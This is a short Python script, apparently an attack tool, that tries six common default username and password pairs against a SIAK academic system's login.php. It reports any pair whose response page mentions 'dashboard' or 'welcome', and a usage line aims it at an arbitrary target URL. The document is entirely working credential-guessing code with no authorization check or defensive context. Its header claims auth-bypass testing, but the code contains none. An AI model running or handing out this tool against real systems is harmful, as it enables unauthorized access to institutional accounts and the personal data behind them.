#!/usr/bin/env python3
# SIAK-specific vuln scanner (common auth bypass, default creds)
import requests
from concurrent.futures import ThreadPoolExecutor

def test_siak_creds(base_url):
    siak_creds = [
        ('admin', 'admin'), ('siak', 'siak'), ('admin', '123456'),
        ('root', 'root'), ('siakad', 'siakad'), ('admin', 'password')
    ]
    
    for user, pwd in siak_creds:
        resp = requests.post(f"{base_url}/login.php", 
                           data={'username':user, 'password':pwd})
        if "dashboard" in resp.text.lower() or "welcome" in resp.text.lower():
            return f"SIAK CREDS: {user}:{pwd}"
    return None

# Usage: python3 siak_enum.py http://target.com